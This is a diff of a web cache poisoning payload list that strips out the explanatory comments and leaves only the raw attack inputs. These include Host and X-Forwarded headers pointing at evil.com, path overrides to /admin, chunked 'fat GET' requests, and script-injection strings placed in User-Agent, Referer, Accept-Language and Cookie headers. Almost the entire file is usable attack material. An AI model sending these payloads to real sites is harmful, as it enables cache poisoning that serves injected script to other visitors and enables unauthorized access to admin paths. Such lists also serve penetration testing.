@@ -1,57 +1,37 @@
-# ============================================================
-# Web Cache Deception — Cache Poisoning Headers
-# ============================================================
-
-# ---- Host Header Poisoning ----
 Host: evil.com
 X-Forwarded-Host: evil.com
 X-Forwarded-Server: evil.com
 X-Host: evil.com
 
-# ---- Protocol Poisoning ----
 X-Forwarded-Proto: http
 X-Forwarded-Scheme: http
 X-Forwarded-SSL: off
 
-# ---- Port Poisoning ----
 X-Forwarded-Port: 81
 X-Forwarded-Port: 443
 
-# ---- Path Override ----
 X-Original-URL: /admin
 X-Rewrite-URL: /admin
 
-# ---- Fat GET Poisoning ----
 GET / HTTP/1.1
 Host: target.com
 X-HTTP-Method-Override: POST
 Transfer-Encoding: chunked
 
-# ---- Unkeyed Header Injection ----
 X-Forwarded-For: "><script>alert(1)</script>
 User-Agent: "><script>alert(1)</script>
 Referer: "><script>alert(1)</script>
 Accept-Language: "><script>alert(1)</script>
 
-# ---- Cookie Unkeyed Poisoning ----
-# Session cookies often unkeyed in cache
 Cookie: utm_source="><script>alert(1)</script>
 Cookie: language=en; language="><script>alert(1)</script>
 
-# ---- Cache Buster (avoid poisoning yourself) ----
-# Add unique cache buster param to avoid poisoning shared cache:
 ?cb=RANDOM123
 
-# ---- Vary Header Detection ----
-# Check if Vary header contains your injected header → not unkeyed
-# Vary: User-Agent, Accept-Encoding
-
-# ---- Cache-Control Bypass ----
 Cache-Control: no-cache
 Cache-Control: no-store, must-revalidate
 Pragma: no-cache
 
-# ---- Web Cache Poisoning via Fat POST ----
 GET /?param=cached HTTP/1.1
 Host: target.com
 Content-Length: 50
